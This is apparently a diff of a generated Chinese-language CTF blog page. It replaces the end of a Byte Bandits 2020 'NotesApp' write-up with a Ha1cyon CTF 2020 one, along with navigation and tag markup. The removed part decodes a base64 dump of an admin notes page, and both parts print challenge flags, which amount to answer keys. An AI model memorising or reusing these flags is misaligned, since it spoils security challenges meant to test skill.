-<pre><code>echo 'CgkJCjxkaXYgY2xhc3M9Imhlcm8gaXMtZnVsbGhlaWdodCBpcy1jZW50ZXJlZCBpcy12Y2VudGVyZWQgaXMtcHJpbWFyeSI+Cgk8ZGl2IGNsYXNzPSJoZXJvLWhlYWQiPgoJCTxuYXYgY2xhc3M9Im5hdmJhciI+CgkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItYnJhbmQiPgoJCQkJCTxhIGhyZWY9Ii8iIGNsYXNzPSJuYXZiYXItaXRlbSI+CgkJCQkJCU15Tm90ZXMKCQkJCQk8L2E+CgkJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9Im5hdmJhci1tZW51Ij4KCQkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItZW5kIj4KCQkJCQkJPHNwYW4gY2xhc3M9Im5hdmJhci1pdGVtIj4KCQkJCQkJCTxhIGhyZWY9Ii9sb2dvdXQiIGNsYXNzPSJidXR0b24gaXMtcHJpbWFyeSBpcy1pbnZlcnRlZCI+CgkJCQkJCQkJPHNwYW4+TG9nb3V0PC9zcGFuPgoJCQkJCQkJPC9hPgoJCQkJCQk8L3NwYW4+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9uYXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9Imhlcm8tYm9keSBjb2x1bW5zIGlzLWNlbnRlcmVkIGhhcy10ZXh0LWNlbnRlcmVkIj4KCQk8ZGl2IGNsYXNzPSJjb2x1bW4gaXMtNCI+CgkJCTxkaXYgY2xhc3M9InRpdGxlIj4KCQkJCUhvd2R5IGFkbWluIQoJCQk8L2Rpdj4KCQkJPCEtLSBzbyB0aGF0IHVzZXIgY2FuIHdyaXRlIGh0bWwgLS0+CgkJCTxwPglmbGFne2NoNDFuX3RIeV8zWHBsb2l0c190MF93MW59IDwvcD4KCQkJPGJyPgoJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iL3VwZGF0ZV9ub3RlcyI+CgkJCQk8dGV4dGFyZWEgY2xhc3M9InRleHRhcmVhIiBuYW1lPSJub3RlcyIgcGxhY2Vob2xkZXI9IldyaXRlIHNvbWV0aGluZyBoZXJlIj48L3RleHRhcmVhPgoJCQkJPGlucHV0IGNsYXNzPSJidXR0b24gaXMtZnVsbHdpZHRoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGRhdGUiIG5hbWU9IiI+CgkJCTwvZm9ybT4KCQk8L2Rpdj4KCTwvZGl2Pgo8L2Rpdj4KCgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogIDxkaXYgY2xhc3M9ImNvbnRlbnQgaGFzLXRleHQtY2VudGVyZWQiPgogICAgPHA+CiAgICAgIDxzdHJvbmc+TXlOb3Rlczwvc3Ryb25nPiBieSBuMG9iLgogICAgPC9wPgogIDwvZGl2Pgo8L2Zvb3Rlcj4KCg=='|base64 -d
-</code></pre><p>看到<code>&lt;p&gt;    flag{ch41n_tHy_3Xploits_t0_w1n} &lt;/p&gt;</code></p>
-<p><strong>flag:</strong></p>
-<p>flag{ch41n_tHy_3Xploits_t0_w1n}</p>
+</code></pre><p>flag:</p>
+<p>flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -764,7 +774,7 @@ sleep(60);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mo0n.top/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/">http://mo0n.top/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/</a>
+                    <a href="http://mo0n.top/2020/04/21/ha1cyon-ctf2020-writeup/">http://mo0n.top/2020/04/21/ha1cyon-ctf2020-writeup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -810,10 +820,6 @@ sleep(60);
                                     <span class="chip bg-color">writeup</span>
                                 </a>
                             
-                                <a href="/tags/xss/">
-                                    <span class="chip bg-color">xss</span>
-                                </a>
-                            
                         </div>
                     
                 </div>
@@ -852,29 +858,30 @@ sleep(60);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/04/18/wpictf2020-bu-fen-writeup/">
+                <a href="/2020/04/21/ha1cyon-ctf2020-writeup/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/30.jpg" class="responsive-img" alt="WPICTF-2020-部分writeup">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Ha1cyonCTF2020-部分writeup.md">
                         
-                        <span class="card-title">WPICTF-2020-部分writeup</span>
+                        <span class="card-title">Ha1cyonCTF2020-部分writeup.md</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            虎符前一天看一下
+                            Ha1cyonCTF2020-部分writeup
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -887,6 +894,7 @@ sleep(60);
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -909,24 +917,24 @@ sleep(60);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/04/09/bei-wang/">
+                <a href="/2020/04/19/hfctf2020-bu-fen-writeup/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/29.jpg" class="responsive-img" alt="备忘录">
+                        <img src="/medias/featureimages/31.jpg" class="responsive-img" alt="hfctf2020部分writeup">
                         
-                        <span class="card-title">备忘录</span>
+                        <span class="card-title">hfctf2020部分writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            备忘录
+                            太菜了
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
                             </span>
                         <span class="publish-author">
                             
@@ -945,6 +953,10 @@ sleep(60);
                     
                     <a href="/tags/web/">
                         <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/writeup/">
+                        <span class="chip bg-color">writeup</span>
                     </a>
                     
                 </div>
